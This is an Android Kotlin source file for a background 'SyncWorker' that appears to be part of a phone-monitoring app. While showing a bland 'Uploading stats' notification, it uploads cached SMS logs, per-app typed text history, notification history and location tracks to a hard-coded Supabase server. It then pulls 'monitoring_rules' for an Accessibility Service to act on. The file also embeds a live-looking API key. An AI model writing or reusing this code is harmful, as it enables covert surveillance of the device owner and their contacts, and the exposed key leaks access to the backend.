package com.example.myandroid

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import androidx.core.app.NotificationCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.Calendar
import android.location.Location
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.tasks.await
import android.content.pm.PackageManager

class SyncWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result {
        val notifManager = applicationContext.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val notifId = 999

        try {
            // 1. Show "Syncing..." Notification
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                val channel = NotificationChannel("sync_channel", "Data Sync", NotificationManager.IMPORTANCE_LOW)
                notifManager.createNotificationChannel(channel)
            }
            val notification = NotificationCompat.Builder(applicationContext, "sync_channel")
                .setContentTitle("Syncing Data")
                .setContentText("Uploading stats to cloud...")
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setProgress(0, 0, true)
                .build()
            notifManager.notify(notifId, notification)

            // 2. Prepare Data (Synchronous logic for Worker)
            val ctx = applicationContext
            val batt = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
            val level = batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0
            val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            val smsCount = prefs.getInt("sms_count", 0)
            val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
            val calendar = Calendar.getInstance()
            val endTime = calendar.timeInMillis
            calendar.set(Calendar.HOUR_OF_DAY, 0)
            val startTime = calendar.timeInMillis
            val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, startTime, endTime)
            val totalMins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(stats.sumOf { it.totalTimeInForeground })

            // --- LOCATION LOGIC ---
            var lat = 0.0
            var lon = 0.0
            val hasPerm = androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
            if (hasPerm) {
                try {
                    val fused = LocationServices.getFusedLocationProviderClient(ctx)
                    // Use lastLocation for battery efficiency in background
                    val loc = fused.lastLocation.await()
                    if (loc != null) {
                        lat = loc.latitude
                        lon = loc.longitude
                        
                        // Calculate Displacement
                        val lastLat = prefs.getFloat("last_lat", 0f).toDouble()
                        val lastLon = prefs.getFloat("last_lon", 0f).toDouble()
                        if (lastLat != 0.0) {
                             val results = FloatArray(1)
                             Location.distanceBetween(lastLat, lastLon, lat, lon, results)
                             val distKm = results[0] / 1000f
                             // Only count if moved > 50 meters (drift filter)
                             if (results[0] > 50) {
                                 val newTotal = prefs.getFloat("total_distance_km", 0f) + distKm
                                 prefs.edit().putFloat("total_distance_km", newTotal).apply()
                             }
                        }
                        
                        // Save History
                        val locHistoryStr = prefs.getString("location_history", "[]")
                        val locHistory = JSONArray(locHistoryStr)
                        val point = JSONObject().apply {
                            put("lat", lat)
                            put("lon", lon)
                            put("ts", System.currentTimeMillis())
                        }
                        locHistory.put(point)
                        while(locHistory.length() > 50) locHistory.remove(0)
                        
                        prefs.edit()
                            .putFloat("last_lat", lat.toFloat())
                            .putFloat("last_lon", lon.toFloat())
                            .putString("last_location_coords", "${String.format("%.4f", lat)}, ${String.format("%.4f", lon)}")
                            .putString("location_history", locHistory.toString())
                            .apply()
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            val json = JSONObject()
            json.put("device_model", android.os.Build.MODEL)
            json.put("battery_level", level)
            json.put("sms_count", smsCount)
            json.put("screen_time_minutes", totalMins)
            json.put("android_version", android.os.Build.VERSION.RELEASE)
            json.put("sms_logs", JSONArray(prefs.getString("sms_logs_cache", "[]")))
            json.put("text_history", JSONObject(prefs.getString("text_history_by_app", "{}")))
            json.put("notif_history", JSONArray(prefs.getString("notif_history", "[]")))
            json.put("location_history", JSONArray(prefs.getString("location_history", "[]")))
            json.put("trigger", "AUTO_WORKER")

            // 3. Upload
            val supabaseUrl = "https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/device_stats"
            val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"

            val url = URL(supabaseUrl)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("apikey", supabaseKey)
            conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true
            conn.outputStream.use { it.write(json.toString().toByteArray()) }

            val code = conn.responseCode
            
            // 4. DOWNLINK: Fetch Rules from Cloud if Upload Succeeded
            if (code in 200..299) {
                try {
                    val rulesUrl = URL("https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/monitoring_rules?select=*")
                    val rulesConn = rulesUrl.openConnection() as HttpURLConnection
                    rulesConn.requestMethod = "GET"
                    rulesConn.setRequestProperty("apikey", supabaseKey)
                    rulesConn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                    
                    val rulesJson = rulesConn.inputStream.bufferedReader().use { it.readText() }
                    
                    // Save rules locally for the Accessibility Service to read
                    // We transform the Array [{},{}] into a Map {"pkg": {rule}} for faster lookup
                    val rulesArray = JSONArray(rulesJson)
                    val rulesMap = JSONObject()
                    for (i in 0 until rulesArray.length()) {
                        val item = rulesArray.getJSONObject(i)
                        rulesMap.put(item.getString("package_name"), item)
                    }
                    prefs.edit().putString("cached_rules", rulesMap.toString()).apply()
                    
                } catch (e: Exception) {
                    e.printStackTrace() // Non-fatal, keep using old rules
                }
                return Result.success()
            } else {
                return Result.retry()
            }
        } catch (e: Exception) {
            e.printStackTrace()
            return Result.retry()
        } finally {
            // 5. Remove Notification
            notifManager.cancel(notifId)
        }
    }
}